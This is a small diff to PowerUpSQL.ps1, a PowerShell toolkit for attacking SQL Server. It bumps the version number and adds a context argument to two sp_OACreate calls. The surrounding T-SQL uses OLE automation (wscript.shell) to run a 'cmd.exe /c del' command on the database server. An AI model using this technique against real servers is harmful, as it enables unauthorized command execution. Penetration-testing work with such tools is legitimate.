@@ -3,7 +3,7 @@
         File: PowerUpSQL.ps1
         Author: Scott Sutherland (@_nullbind), NetSPI - 2016
         Major Contributors: Antti Rantasaari and Eric Gruber
-        Version: 1.0.0.84
+        Version: 1.0.0.85
         Description: PowerUpSQL is a PowerShell toolkit for attacking SQL Server.
         License: BSD 3-Clause
         Required Dependencies: PowerShell v.2
@@ -1528,7 +1528,7 @@ DECLARE @o int
 DECLARE @f int
 DECLARE @ret int 
 DECLARE @FileContents varchar(8000) 
-EXEC Sp_oacreate 'scripting.filesystemobject' , @fso Output
+EXEC Sp_oacreate 'scripting.filesystemobject' , @fso Output, 5
 EXEC Sp_oamethod @fso, 'opentextfile' , @file Out, '$OutputPath',1
 EXEC sp_oacreate 'scripting.filesystemobject', @o out 
 EXEC sp_oamethod @o, 'opentextfile', @f out, '$OutputPath', 1 
@@ -1543,7 +1543,7 @@ SELECT @FileContents as output
                 $QueryRemoveFile = 
 @"
 DECLARE @Shell INT
-EXEC Sp_oacreate 'wscript.shell' , @shell Output
+EXEC Sp_oacreate 'wscript.shell' , @shell Output, 5
 EXEC Sp_oamethod @Shell, 'run' , null, 'cmd.exe /c "del $OutputPath"' , '0' , 'true'
 "@
                 # Run query    
